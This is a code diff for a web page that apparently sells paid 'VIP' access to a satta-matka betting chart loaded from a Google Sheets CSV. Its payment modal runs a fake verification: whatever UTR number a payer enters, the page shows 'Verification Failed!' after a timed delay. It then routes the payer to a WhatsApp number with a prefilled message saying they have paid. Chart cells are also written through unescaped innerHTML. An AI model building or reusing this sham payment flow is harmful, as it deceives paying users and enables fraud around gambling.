@@ -20,25 +20,26 @@
         
         .intro-text { background: var(--yellow-accent); padding: 15px; margin: 15px auto; width: 90%; border: 3px solid #fff; font-size: 13px; color: var(--dark-blue); font-weight: bold; border-radius: 15px; }
         
-        .scroll-btn { background: #65bbf5; color: var(--dark-blue); padding: 10px 20px; border: 4px solid #fff; border-radius: 15px; cursor: pointer; margin: 10px; font-size: 14px; font-weight: 700; display: inline-block; text-decoration: none;}
+        .scroll-btn { background: #65bbf5; color: var(--dark-blue); padding: 10px 20px; border: 4px solid #fff; border-radius: 15px; cursor: pointer; margin: 10px; font-size: 14px; font-weight: 700; display: inline-block; text-decoration: none; }
 
-        /* Chart Styles - Fixed Display */
-        #chartArea { background: #fff; width: 98%; margin: 10px auto; border: 1px solid var(--grid-border); overflow: hidden; }
+        /* Chart Fix */
+        #chartArea { background: #fff; width: 98%; margin: 10px auto; border: 1px solid var(--grid-border); }
         .chart-grid { display: grid; grid-template-columns: 50px repeat(6, 1fr); width: 100%; background: #fff; }
+        
         .day-label, .date-label { background: #000; color: var(--yellow-accent); font-weight: bold; font-size: 10px; padding: 10px 0; border: 0.5px solid var(--grid-border); }
         
         .date-box { background: #f2f2f2; font-size: 9px; border: 0.5px solid var(--grid-border); display: flex; align-items: center; justify-content: center; font-weight: bold; height: 65px; color: #000; }
-        .cell { position: relative; background: #fff; border: 0.5px solid var(--grid-border); display: flex; align-items: center; justify-content: center; height: 65px; }
+        .cell { position: relative; background: #fff; border: 0.5px solid var(--grid-border); display: flex; align-items: center; justify-content: center; height: 65px; box-sizing: border-box; }
         
         .panna { display: flex; flex-direction: column; font-size: 9px; color: #555; position: absolute; line-height: 1.1; font-weight: bold; width: 12px; text-align: center; }
         .panna.left { left: 2px; } .panna.right { right: 2px; }
-        .panna span { display: block; }
         .jodi { font-size: 20px; font-weight: bold; color: #000; }
         .red-house .jodi, .red-house .panna { color: var(--red) !important; }
+        
         .single-vip-lock { color: #f70031; font-size: 22px; animation: blink 1.5s infinite; }
         @keyframes blink { 50% { opacity: 0.4; } }
 
-        /* Payment Modal */
+        /* Payment UI */
         .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 2000; align-items: center; justify-content: center; }
         .modal-content { background: #fff; width: 85%; max-width: 380px; padding: 20px; border-radius: 20px; color: #333; }
         .plan-box { border: 2px solid var(--dark-blue); margin: 10px 0; padding: 12px; border-radius: 10px; cursor: pointer; font-weight: bold; background: var(--yellow-accent); color: var(--dark-blue); }
@@ -48,9 +49,7 @@
         input { width: 85%; padding: 12px; margin: 10px 0; border: 2px solid #ccc; border-radius: 8px; font-size: 16px; }
         .verify-btn { background: #28a745; color: #fff; padding: 12px 30px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; width: 90%; }
         
-        .failed-box { color: var(--red); font-weight: bold; }
-
-        .disclaimer { width: 90%; margin: 20px auto; padding: 15px; background: #fff; border-radius: 10px; font-size: 11px; color: #444; text-align: justify; border: 1px dashed var(--dark-blue); }
+        .disclaimer { width: 90%; margin: 20px auto; padding: 15px; background: rgba(255,255,255,0.6); border-radius: 10px; font-size: 11px; color: #444; text-align: justify; border: 1px dashed var(--dark-blue); }
     </style>
 </head>
 <body>
@@ -69,8 +68,7 @@
         <div class="date-label">DATE</div>
         <div class="day-label">MON</div><div class="day-label">TUE</div><div class="day-label">WED</div>
         <div class="day-label">THU</div><div class="day-label">FRI</div><div class="day-label">SAT</div>
-        <div id="gridData" style="display:contents;">
-            </div>
+        <div id="gridData" style="display: contents;"></div>
     </div>
 </div>
 
@@ -103,11 +101,11 @@
             <button class="verify-btn" onclick="startVerification()">VERIFY PAYMENT</button>
         </div>
 
-        <div id="stepFailed" style="display:none;" class="failed-box">
-            <h2 style="font-size:40px;">⚠️</h2>
-            <h3>Verification Failed!</h3>
+        <div id="stepFailed" style="display:none;">
+            <h2 style="font-size:40px; color:red;">⚠️</h2>
+            <h3 style="color:red;">Verification Failed!</h3>
             <p>पेमेंट वेरिफाई नहीं हुआ। हेल्प के लिए संपर्क करें।</p>
-            <button class="scroll-btn" onclick="sendToWhatsapp()" style="background:#25D366; color:white;">WHATSAPP SUPPORT</button>
+            <button class="scroll-btn" onclick="sendToWhatsapp()" style="background:#25D366; color:white; border:none;">WHATSAPP SUPPORT</button>
         </div>
     </div>
 </div>
@@ -124,7 +122,6 @@
         document.getElementById('stepPlan').style.display = 'block';
         document.getElementById('stepPay').style.display = 'none';
         document.getElementById('stepFailed').style.display = 'none';
-        timeLeft = 120;
     }
 
     function showPayment(amt, plan) {
@@ -136,6 +133,8 @@
     }
 
     function startTimer() {
+        timeLeft = 120;
+        clearInterval(timerId);
         timerId = setInterval(() => {
             timeLeft--;
             let mins = Math.floor(timeLeft / 60);
@@ -147,8 +146,8 @@
 
     function startVerification() {
         let utr = document.getElementById('utrInput').value;
-        if(utr.length < 10) { alert("Enter UTR No."); return; }
-        document.querySelector('.verify-btn').innerText = "Processing...";
+        if(utr.length < 10) { alert("Enter 12 Digit UTR No."); return; }
+        document.querySelector('.verify-btn').innerText = "Verifying...";
         setTimeout(showFailed, 3000);
     }
 
@@ -160,5 +159,60 @@
 
     function sendToWhatsapp() {
         let utr = document.getElementById('utrInput').value;
-        let msg = `Bhai maine ₹${selectedAmount} pay kiya hai. UTR: ${utr}. Unlock my VIP.`;
-        window.open(`https://wa.me/918103982813?
+        let msg = `Bhai maine ₹${selectedAmount} pay kiya hai. UTR: ${utr}. Mera VIP chart open kardo.`;
+        window.open(`https://wa.me/918103982813?text=${encodeURIComponent(msg)}`, '_blank');
+    }
+
+    const CSV_URL = "https://docs.google.com/spreadsheets/d/1IReRyQjRvWWVjZTym_8DDXvx9Jttjfgy18McY53gM5w/export?format=csv";
+
+    async function loadChart() {
+        try {
+            const res = await fetch(CSV_URL + "&cache=" + new Date().getTime());
+            const data = await res.text();
+            const rows = data.split('\n').map(r => r.split(','));
+            let h = ''; let lockPlaced = false;
+
+            for(let i=1; i<rows.length; i++) {
+                let dateStr = (rows[i][0]||"").trim().replace(/"/g,"");
+                if(!dateStr) continue;
+                
+                h += `<div class="date-box">${dateStr}</div>`;
+                
+                for(let j=1; j<=16; j+=3) {
+                    let l = (rows[i][j]||"").trim().replace(/"/g,"");
+                    let jo = (rows[i][j+1]||"").trim().replace(/"/g,"");
+                    let r = (rows[i][j+2]||"").trim().replace(/"/g,"");
+
+                    if(!l && !jo && !r) {
+                        if(!lockPlaced) { 
+                            h += `<div class="cell"><div class="single-vip-lock">🔒</div></div>`; 
+                            lockPlaced = true; 
+                        } else { 
+                            h += `<div class="cell"></div>`; 
+                        }
+                    } else {
+                        let isRed = false;
+                        if(jo.length >= 2) {
+                            if(jo[0] === jo[1] || Math.abs(parseInt(jo[0]) - parseInt(jo[1])) === 5) isRed = true;
+                        }
+                        if(jo.includes('*')) isRed = true;
+                        
+                        let lh = l.split('').map(s => `<span>${s}</span>`).join('');
+                        let rh = r.split('').map(s => `<span>${s}</span>`).join('');
+                        h += `<div class="cell ${isRed ? 'red-house' : ''}">
+                                <div class="panna left">${lh}</div>
+                                <div class="jodi">${jo}</div>
+                                <div class="panna right">${rh}</div>
+                              </div>`;
+                    }
+                }
+            }
+            document.getElementById('gridData').innerHTML = h;
+        } catch(e) { 
+            document.getElementById('gridData').innerHTML = "<div style='grid-column: span 7; padding:20px;'>Data Load Failed</div>"; 
+        }
+    }
+    loadChart();
+</script>
+</body>
+</html>
